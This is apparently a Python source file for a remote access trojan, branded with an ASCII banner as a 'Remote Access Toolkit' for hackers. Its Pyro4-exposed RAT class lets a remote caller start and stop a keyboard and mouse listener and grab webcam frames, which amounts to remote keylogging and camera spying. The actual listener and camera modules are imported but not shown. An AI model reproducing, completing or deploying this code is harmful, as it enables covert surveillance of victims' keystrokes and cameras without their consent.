
BANNER = r"""
   _____ _ _            _        _____                  _             
  / ____| (_)          | |      / ____|                | |            
 | (___ | |_  ___ _ __ | |_ ___| (___   ___  ___   ___ | | _____ _ __ 
  \___ \| | |/ _ \ '_ \| __/ _ \\___ \ / _ \/ __| / _ \| |/ / _ \ '__|
  ____) | | |  __/ | | | ||  __/____) |  __/\__ \| (_) |   <  __/ |   
 |_____/|_|_|\___|_| |_|\__\___|_____/ \___||___(_)___/|_|\_\___|_|   

        Remote Access Toolkit | by Ethical Hackers, for Hackers
"""
print(BANNER)

from rat.listeners import KeyboardMouseListener
from rat.camera import Camera
from rat.security import Authenticator
import Pyro4

@Pyro4.expose
class RAT:
    def __init__(self, auth_token):
        self.auth = Authenticator(auth_token)
        self.listener = KeyboardMouseListener()
        self.camera = Camera()

    def start(self, token):
        self.auth.verify(token)
        self.listener.start()

    def stop(self, token):
        self.auth.verify(token)
        self.listener.stop()

    def capture_frame(self, token):
        self.auth.verify(token)
        return self.camera.capture()
